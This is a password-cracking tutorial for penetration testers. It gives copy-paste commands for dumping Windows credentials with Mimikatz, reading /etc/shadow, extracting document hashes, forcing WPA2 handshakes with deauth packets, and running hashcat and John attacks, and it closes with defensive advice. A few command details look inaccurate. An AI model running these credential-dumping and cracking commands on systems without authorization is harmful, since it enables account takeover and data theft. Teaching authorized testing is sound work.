# Password Cracking Techniques

> ⚠️ **Ethical & Legal Notice**\
> This tutorial is written for **authorized penetration testers**, **red-teamers**, **digital-forensics analysts**, and **security researchers** who have **explicit written permission** to test or recover systems they **own or are contracted to assess**.\
> Unauthorized password cracking is **illegal** in most jurisdictions and violates the **Computer Fraud and Abuse Act (CFAA)**, **GDPR**, and other laws.\
> **Always** obtain a signed **Rules of Engagement (RoE)** document before you begin.
>
>

***

## <mark style="color:yellow;">Password Cracking Techniques Tutorial</mark>

> From theory to Hashcat rules, with copy-paste commands for every major tool.

***

### <mark style="color:yellow;">1. Mind-Map: How We Will Crack Passwords</mark>

| 🔸Phase                  | 🔸Goal                      | 🔸Tools                                       |
| ------------------------ | --------------------------- | --------------------------------------------- |
| 1. Recon                 | Find hashes / capture files | Responder, Mimikatz, hashdump, zip2john, etc. |
| 2. Pre-Processing        | Convert to crackable format | `unshadow`, `hashcat -m`, `john --format`     |
| 3. Word-Smithing         | Build targeted word-lists   | CeWL, Crunch, RSMangler, Mentalist            |
| 4. Rule-Based Mutation   | Expand words 100×           | OneRuleToRuleThemAll, dive.rule               |
| 5. Mask & Brute          | Exhaust key-space           | Hashcat masks, John incremental               |
| 6. Hardware Acceleration | Go 100-1000× faster         | NVidia RTX 4090, Hashcat -O, -w 4             |
| 7. Post-Processing       | Document & rotate           | `hashcat --show`, Pipal stats                 |

***

### <mark style="color:yellow;">2. Recon: Grab the Hashes</mark>

#### 🔸2.1 Windows Live Domain

```bash
# Run from DA context
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::lsa /patch
# Output: user:rid:lm:ntlm:::
```

Save only the **NTLM** part (`ntlm.hash`).

#### 🔸2.2 Linux `/etc/shadow`

```bash
unshadow /etc/passwd /etc/shadow > shadow.unshadow
john shadow.unshadow          # auto-detects SHA-512-crypt
```

#### 🔸2.3 ZIP / Office / PDF

```bash
zip2john secret.zip  > zip.hash
keepass2john db.kdbx > keepass.hash
office2john file.docx > office.hash
```

***

### <mark style="color:yellow;">3. Choose Your Weapon & Format</mark>

| 🔸Hash-Type   | 🔸Example                          | 🔸Hashcat Mode | 🔸John Format |
| ------------- | ---------------------------------- | -------------- | ------------- |
| NTLM          | `31d6cfe0d16ae931b73c59d7e0c089c0` | 1000           | `nt`          |
| Net-NTLMv2    | `$net-ntlmv2$...`                  | 5600           | `netntlmv2`   |
| WPA2-EAPOL    | `.hccapx`                          | 22000          | `wpapsk`      |
| bcrypt        | `$2a$10$...`                       | 3200           | `bcrypt`      |
| SHA-512-crypt | `$6$rounds=5000$...`               | 1800           | `sha512crypt` |

🔸**Pro-tip**: `hashcat -m 0 -a 0 hash.txt wordlist.txt --identify` (auto-detect).

***

### <mark style="color:yellow;">4. Dictionary Attacks – Fast First Blood</mark>

#### 🔸4.1 Classic Word-List

```bash
hashcat -m 1000 -a 0 ntlm.hash \
        /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
        -O -w 3 --status
```

* `-O` = optimized kernel (limits length ≤ 31 for NTLM).
* `-w 3` = high workload, fan spins up.

#### 🔸4.2 Custom Company-Specific List (Spidering)

```bash
cewl -d 4 -m 3 -w company.txt https://target.com
# Add mutations
rsmangler < company.txt >> company-mangled.txt
```

Run same command but replace word-list.

***

### <mark style="color:yellow;">5. Rule-Based Mutation – 100× Bigger Without 100× Disk</mark>

🔸Hashcat built-in rules:

```bash
hashcat -m 1000 -a 0 ntlm.hash rockyou.txt \
        -r rules/best64.rule -O -w 3
```

🔸John equivalent:

```bash
john shadow.unshadow --wordlist=rockyou.txt --rules=Single
```

🔸**OneRuleToRuleThemAll** (GitHub) gives \~7× more hits than best64:

```bash
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
hashcat -m 1000 -a 0 ntlm.hash rockyou.txt -r OneRuleToRuleThemAll.rule
```

***

### <mark style="color:yellow;">6. Mask Attack – When You Know the Policy</mark>

🔸**Policy intel**: 8 chars, 1 upper, 1 digit, 1 special, ends with `!`\
🔸Build mask: `?u?a?a?a?a?a?a!`

```bash
hashcat -m 1000 -a 3 ntlm.hash ?u?a?a?a?a?a?a! -O -w 4
```

🔸Custom char-set (save as `custom.hcchr`):

```
-u -l -d -s
```

🔸Then:

```bash
hashcat -m 1000 -a 3 ntlm.hash -1 custom.hcchr ?1?1?1?1?1?1?1?1 -O
```

**Time estimation** (RTX 4090, NTLM):

* 8 × `?a` = 95^8 ≈ 6.6 quadrillion → 9 years at 200 GH/s
* 8 × custom (62) = 62^8 → 110 days
* 10 × `?d` = 10^10 → 50 s (crack!)

***

### <mark style="color:yellow;">7. Combinator & Hybrid – Mix Two Wordlists</mark>

```bash
hashcat -m 1000 -a 1 ntlm.dict \
        rockyou.txt seasons.txt -O
# seasons.txt contains Winter Summer etc.
# produces “PasswordWinter”, “letmeinSummer”…
```

***

### <mark style="color:yellow;">8. Rainbow-Tables (Legacy but Still Seen)</mark>

Effective only against **unsalted** fast hashes (LM, NTLM, MD5).\
**Ophcrack** LiveCD:

1. Boot target PC → Ophcrack → Tables: Vista-free (0.5 GB) / XP-special (7.5 GB).
2. Automatic LM/NTLM crack; shows plaintext in GUI.

**Defense**: disable LM hash (`HKLM\System\CurrentControlSet\Control\Lsa\NoLMHash`), use **salted** hashes (bcrypt, scrypt, Argon2).

***

### <mark style="color:yellow;">9. WPA2 / WPA-PSK Example – From Capture to Key</mark>

🔸**Step 1**: Capture handshake

```bash
airmon-ng start wlan0
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0
# de-auth to force handshake
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0
```

🔸**Step 2**: Convert

```bash
aircrack-ng handshake-01.cap -J hashcat.hccapx
```

🔸**Step 3**: Crack

```bash
hashcat -m 22000 hashcat.hccapx rockyou.txt -r rules/best64.rule -O
```

***

### <mark style="color:yellow;">10. Using John the Ripper – CPU-Friendly, Wordlist-Flexible</mark>

🔸**Single-mode** (instant on same user):

```bash
john shadow.unshadow --single
```

🔸**Incremental** (true brute-force, length 1-8 by default):

```bash
john shadow.unshadow --incremental=ASCII
```

🔸**Resume**:

```bash
john --restore
```

**GPU-enable** John (jumbo with OpenCL):

```bash
john shadow.unshadow --format=sha512crypt-opencl --wordlist=rockyou.txt
```

***

### <mark style="color:yellow;">11. Hardware Tuning – Make Your GPU Sweat</mark>

| 🔸GPU       | 🔸NTLM Speed | 🔸Power |
| ----------- | ------------ | ------- |
| RTX 4090    | 200 GH/s     | 450 W   |
| RTX 3090 Ti | 140 GH/s     | 350 W   |
| RTX 3060    | 60 GH/s      | 170 W   |

**hashcat tuning**:

```bash
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a \
        -O -w 4 --force --hwmon-disable --nvidia-spin-damp 80
```

Monitor temp:

```bash
watch -n 2 nvidia-smi
```

***

### <mark style="color:yellow;">12. Post-Processing – Stats & Reporting</mark>

**Cracked passwords**:

```bash
hashcat --show -m 1000 ntlm.hash > cracked.txt
```

**Analyze**:

```bash
pipal cracked.txt   # lengths, masks, top patterns
```

**Rotate / remediate**:

* Feed results back to SIEM.
* Force reset on next logon.
* Add to custom “banned-password” list in Azure AD or AD LDS.

***

### <mark style="color:yellow;">13. Defense Cheatsheet (Because We Break to Build)</mark>

1. **Salt + modern hash**: bcrypt (cost 12), scrypt (N=2^14,r=8,p=1), Argon2id.
2. **14-char passphrase minimum**, not 8-complex.
3. **Lockout + MFA** to make online attacks uneconomical.
4. **Disable LM**, use Kerberos armoring (FAST).
5. **Rotate** if hash appears in HaveIBeenPwned.
6. **Audit quarterly** with tools like Specops, L0phtCrack, or this tutorial—on YOUR data.

***

> **“Know thy enemy and patch thy systems.”**\
> Now you’ve seen how fast 200 GH/s eats an 8-character NTLM hash.\
> Go forth—**legally**, **ethically**, and **with permission**—and turn that knowledge into stronger defense.
